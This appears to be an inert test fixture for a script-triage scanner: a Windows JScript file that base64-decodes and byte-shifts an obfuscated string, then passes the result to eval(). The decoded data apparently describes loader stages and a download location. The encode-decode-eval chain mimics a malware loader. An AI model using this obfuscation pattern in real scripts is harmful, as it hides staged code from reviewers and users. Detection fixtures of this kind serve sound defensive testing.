// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
function decodeBase64(text) {
  var alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  var clean = text.replace(/[^A-Za-z0-9+\/=]/g, "");
  var output = [];
  for (var p = 0; p < clean.length; p += 4) {
    var a = alphabet.indexOf(clean.charAt(p));
    var b = alphabet.indexOf(clean.charAt(p + 1));
    var c = clean.charAt(p + 2) == "=" ? -1 : alphabet.indexOf(clean.charAt(p + 2));
    var d = clean.charAt(p + 3) == "=" ? -1 : alphabet.indexOf(clean.charAt(p + 3));
    output.push((a << 2) | (b >> 4));
    if (c >= 0) output.push(((b & 15) << 4) | (c >> 2));
    if (d >= 0) output.push(((c & 3) << 6) | d);
  }
  return output;
}
var decode_c76df024 = function decode_c76df024_body(s) {
  var d = [];
  for (var i = 0; i < s.length; i++) { d.push((s[i] + 25) % 256); }
  return d;
};
var recover_4c8486c2 = function recover_4c8486c2_body() {
  var packedText = "YglaW0xXWgkhQglISlhcUFlMRllMVFZbTAkTCV5ZUFtMRk1QU0wJEwlLUFpXSFtKT0ZXWVZKTFpaCRMJT0hVS1ZNTUZaSllQV1sJRBMJSEtIV1tMWQkhCTRQSllWWlZNWxU/NDMvOzs3CRMJXUhTXExaCSFiCUpIVFdIUE5VRlBLCSEJSkhUV0hQTlUUGExJIBocTEtKHgkTCVxZUwkhCU9bW1daIRYWGExJIBocTEtKHhVMX0hUV1NMFVBVXUhTUEsWGh9NSBcbHiAVS0hbCRMJXFpMWUZITkxVWwkhCS9cVVtZTFpaM0hJFhhMSSAaHExLSh4JEwlNUFNMRldIW08JIQkqIUNDPFpMWVpDQzdcSVNQSkNDL1xVW1lMWlozSElDQ1pbSE5MFBhMSSAaHExLSh4VS0hbCRMJWUxOUFpbWWBGV0hbTwkhCS8yKjxDQzpWTVteSFlMQ0MvXFVbWUxaWjNISUNDK1BaV1ZaSElTTENDGExJIBocTEtKHgkTCVVMX1tGWltITkwJIQlZTFpWXFlKTBRaSFRXU0wVV1oYCWQTCVpbSE5MKlZcVVsJIRtk";
  var s = decodeBase64(packedText);
  var n = ["north", "south"].join(":");
  var d = [];
  for (var pass = 0; pass < 1; pass++) { d = decode_c76df024.apply(null, [s]); }
  var textParts = [];
  for (var bi = 0; bi < d.length; bi++) { textParts.push(String.fromCharCode(d[bi])); }
  var t = textParts.join("");
  return t;
};
var inspect_530f5f2d = function inspect_530f5f2d_body() {
  var o = eval("(" + recover_4c8486c2.apply(null, []) + ")");
  return { steps: o.steps, adapter: o.adapter, values: o.values, stageCount: o.stageCount };
};
